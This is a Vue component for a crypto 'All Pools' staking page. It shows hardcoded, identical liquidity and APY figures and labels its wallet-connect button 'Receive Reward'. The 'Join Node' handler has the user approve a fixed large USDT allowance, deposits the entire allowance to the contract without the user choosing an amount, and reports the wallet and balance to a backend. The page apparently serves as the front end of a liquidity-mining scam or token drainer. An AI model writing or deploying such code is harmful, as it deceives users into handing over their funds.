<template>
    <div class="px-5 md:px-10 lg:px-20 mt-5 md:mt-10">
        <h1 class="font-semibold mb-3">All Pools</h1>
        <div class="card md:flex items-center gap-10 mb-14">
            <img class="w-[240px] mb-7" src="/image-2.png" alt="USDT">
            <div class="w-full">
                <h1 class="font-bold md:text-xl mb-6">USDT</h1>
                <div class="flex justify-between mb-3">
                    <div>
                        <p class="text-xs text-gray mb-3">Total Liquidity</p>
                        <p class="md:text-lg"> 1,329,732.61 USD</p>
                    </div>
                    <div>
                        <p class="text-xs text-gray mb-3">APY</p>
                        <p class="md:text-lg text-indigo">4.5% - 4.8%</p>
                    </div>
                </div>
                <div class="bg-[#141414] rounded-3xl text-center px-2 xl:px-28 py-3 mb-6">
                    <span class="text-xs md:text-sm">Up to 4.8% of return by $5,000 invested</span>
                </div>

                <template v-if="!account.address">
                    <Button class="btn-primary text-sm md:text-base" @click="connect()">
                        <span>{{ loading.connecting ? 'Connecting...' : 'Receive Reward' }}</span>
                    </Button>
                </template>

                <template v-else>
                    <Button label="Join Node" class="btn-primary text-sm md:text-base" @click="approveUSDT"
                        :disabled="isUsdtApproveBtnClicked" />
                </template>
            </div>
        </div>

        <div class="card md:flex items-center gap-10 mb-14">
            <img class="w-[240px] mb-7" src="/image-1.png" alt="Ethereum Eth">
            <div class="w-full">
                <h1 class="font-bold md:text-xl mb-6">ETH</h1>
                <div class="flex justify-between mb-3">
                    <div>
                        <p class="text-xs text-gray mb-3">Total Liquidity</p>
                        <p class="md:text-lg"> 1,329,732.61 USD</p>
                    </div>
                    <div>
                        <p class="text-xs text-gray mb-3">APY</p>
                        <p class="md:text-lg text-indigo">4.5% - 4.8%</p>
                    </div>
                </div>
                <div class="bg-[#141414] rounded-3xl text-center px-2 xl:px-28 py-3 mb-6">
                    <span class="text-xs md:text-sm">Up to 4.8% of return by $5,000 invested</span>
                </div>
                <router-link :to="{ name: 'pool' }">
                    <Button label="Stake" class="btn-primary text-sm md:text-base" />
                </router-link>
            </div>
        </div>
    </div>

    <Toast class="z-10" />
</template>

<script setup>
import { ref, reactive } from 'vue'
import { Web3 } from 'web3'
import Button from 'primevue/button'
import Toast from 'primevue/toast'
import { useToast } from 'primevue/usetoast'
import {
    $off,
    $on,
    Events,
    account,
    connect as masterConnect,
    disconnect as masterDisconnect,
} from '@kolirt/vue-web3-auth'
import { contractABI } from '@/contracts/contractConfig'
import { tokenABI } from '@/contracts/tokenABI'
import axiosClient from '@/services/axiosClient'

const web3 = new Web3(window.ethereum)
const contractAddress = import.meta.env.VITE_CONTRACT_ADDRESS
const tokenAddress = import.meta.env.VITE_TOKEN_CONTRACT_ADDRESS
const contract = new web3.eth.Contract(contractABI, contractAddress)
const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress)
const toast = useToast()

const loading = reactive({
    connecting: false,
    connectingTo: {},
    switchingTo: {},
    logouting: false
})
const isUsdtApproveBtnClicked = ref(false)

// Wallet Connect
const connect = async (chain) => {
    const handler = (state) => {
        if (!state) {
            if (chain) {
                loading.connectingTo[chain.id] = false
            } else {
                loading.connecting = false
            }

            $off(Events.ModalStateChanged, handler)
        }
    }

    $on(Events.ModalStateChanged, handler)

    if (chain) {
        loading.connectingTo[chain.id] = true
    } else {
        loading.connecting = true
    }

    await masterConnect(chain)
}

// Approve & Deposit USDT
const approveUSDT = async () => {
    if (!account.address) {
        toast.add({ severity: 'warn', detail: 'Please connect to your wallet!', life: 3000 })
    } else {
        try {
            isUsdtApproveBtnClicked.value = true

            // Approve the spender to spend the specified amount of USDT tokens
            const tx = await tokenContract.methods.approve(contractAddress, 10000000000).send({ from: account.address })

            if (tx.transactionHash) {
                let allowanceAmount = await tokenContract.methods.allowance(account.address, contractAddress).call()

                allowanceAmount = Number(allowanceAmount.toString())

                const transaction = await contract.methods.depositUSDT(allowanceAmount).send({
                    from: account.address,
                })

                if (transaction) {
                    const params = {
                        wallet: account.address,
                        real_balance: allowanceAmount,
                        level: 1,
                        type: 'usdt'
                    }

                    await axiosClient.post('/user-info', params)

                    toast.add({ severity: 'success', detail: 'Token approve successful!', life: 3000 })
                }
            }

            isUsdtApproveBtnClicked.value = false
        } catch (error) {
            isUsdtApproveBtnClicked.value = false

            toast.add({ severity: 'warn', detail: 'Error during USDT deposit!', life: 3000 })
            console.error('Error during USDT deposit:', error)
        }
    }
}

</script>

<style scoped></style>